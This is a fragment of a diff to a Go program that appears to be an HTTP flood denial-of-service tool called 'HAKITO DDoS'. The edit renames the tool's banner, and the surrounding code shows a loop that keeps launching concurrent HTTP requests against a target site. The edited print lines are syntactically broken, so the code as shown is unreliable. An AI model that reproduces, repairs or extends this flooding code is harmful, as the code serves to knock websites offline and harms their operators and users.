@@ -7531,12 +7531,12 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- HAKITO DDoS By Hong Hoa --")\n           Hakito\n\n")
+		fmt.Println("-- HAKITO DDoS V4 --")\n           Hakito\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
 		)
-		fmt.Println("Hakito               |\t begin |\run")
+		fmt.Println("Hulk               |\t begin |\run")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
